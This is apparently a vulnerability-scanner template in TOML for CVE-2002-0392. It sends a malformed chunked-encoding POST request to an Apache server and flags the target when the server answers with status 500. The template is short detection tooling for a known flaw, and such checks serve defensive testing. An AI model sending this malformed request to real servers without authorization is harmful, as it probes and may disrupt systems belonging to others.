[info]
author = "ave"
description = "通过发送畸形的分块编码（Chunked Encoding）HTTP 请求，验证 Apache 服务器在处理分块大小时的解析缺陷。"
id = "POC-AVE-2002-0005"
name = "Apache HTTP Server Chunked Encoding PoC"
severity = "high"
tags = ["ave-2002-0005"]
vuln_id = [
    "CVE-2002-0392",
    "AVE-2002-0005",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.body]
content = """
1\r
\r
"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
Transfer-Encoding = "chunked"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
